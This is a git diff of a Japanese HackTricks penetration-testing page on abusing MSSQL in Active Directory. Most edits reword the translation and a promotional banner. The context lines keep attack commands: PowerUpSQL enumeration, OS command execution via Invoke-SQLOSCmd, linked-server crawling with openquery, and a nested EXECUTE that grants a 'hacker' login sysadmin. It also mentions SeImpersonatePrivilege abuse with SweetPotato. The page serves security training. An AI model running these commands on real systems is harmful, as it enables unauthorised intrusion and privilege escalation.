@@ -1,13 +1,13 @@
-# MSSQL ADの悪用
+# MSSQL AD悪用
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクション
-* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
-* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
+* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れましょう
+* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[Telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
@@ -18,7 +18,7 @@ PowerUpSQLというPowerShellモジュールはこの場合非常に役立ちま
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
-### ドメインセッションなしでネットワークから列挙
+### ドメインセッションなしでネットワークから列挙する
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -80,9 +80,9 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ## MSSQL信頼されたリンク
 
-もしMSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合、ユーザーが信頼されたデータベースに権限を持っている場合、**信頼関係を使用して他のインスタンスでもクエリを実行することができます**。この信頼関係は連鎖することができ、ユーザーはいくつかの設定ミスのあるデータベースを見つけてコマンドを実行することができるかもしれません。
+もしMSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合、ユーザーが信頼されたデータベースに権限を持っている場合、**信頼関係を使用して他のインスタンスでもクエリを実行することができます**。これらの信頼関係は連鎖することができ、ユーザーはいくつかの構成ミスがあるデータベースを見つけてコマンドを実行することができるかもしれません。
 
-**データベース間のリンクは、フォレストトラストを超えても機能します。**
+**データベース間のリンクは、フォレストトラストを超えて機能します。**
 
 ### Powershellの悪用
 ```powershell
@@ -145,7 +145,7 @@ select * from master..sysservers
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-二重引用符と単一引用符の使用を確認してください。それをそのまま使用することが重要です。
+二重引用符と単一引用符の使用箇所を確認してください。その方法で使用することが重要です。
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (169).png>)
@@ -170,6 +170,6 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 **MSSQLローカルユーザー**は通常、**`SeImpersonatePrivilege`**と呼ばれる特別な特権を持っています。これにより、アカウントは「認証後にクライアントを偽装する」ことができます。
 
-多くの著者が考案した戦略は、SYSTEMサービスをローグまたは中間者サービスに認証させることです。その後、攻撃者が作成したローグサービスは、SYSTEMサービスが認証しようとしている間にSYSTEMサービスを偽装することができます。
+多くの著者が考え出した戦略は、SYSTEMサービスを強制して、攻撃者が作成したローグまたは中間者サービスに認証させることです。このローグサービスは、SYSTEMサービスが認証しようとしている間にSYSTEMサービスを偽装することができます。
 
 [SweetPotato](https://github.com/CCob/SweetPotato)には、Beaconの`execute-assembly`コマンドを介して実行できるこれらのさまざまなテクニックが収録されています。
